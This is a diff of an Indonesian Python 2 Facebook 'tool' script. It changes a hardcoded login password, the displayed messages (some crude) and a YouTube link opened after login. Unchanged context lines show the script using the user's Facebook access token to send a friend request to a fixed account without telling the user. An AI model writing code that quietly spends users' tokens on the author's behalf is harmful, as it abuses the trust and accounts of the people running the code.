@@ -84,12 +84,12 @@ def loginSC():
 	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="dark" and password =="fb":
-		print"\033[1;96m[✓] \033[1;92mLogin success"
+	if username =="ebeck" and password =="kansas":
+		print"\033[1;96m[✓] \033[1;92mLogin BENAR COK"
 		time.sleep(1)
 		login()
 	else:
-		print"\033[1;96m[!] \033[1;91mSalah!!"
+		print"\033[1;96m[!] \033[1;91mSALAHJANCO!!"
 		time.sleep(1)
                 LoginSC()
 
@@ -133,7 +133,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://www.youtube.com/EKIDROOT')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
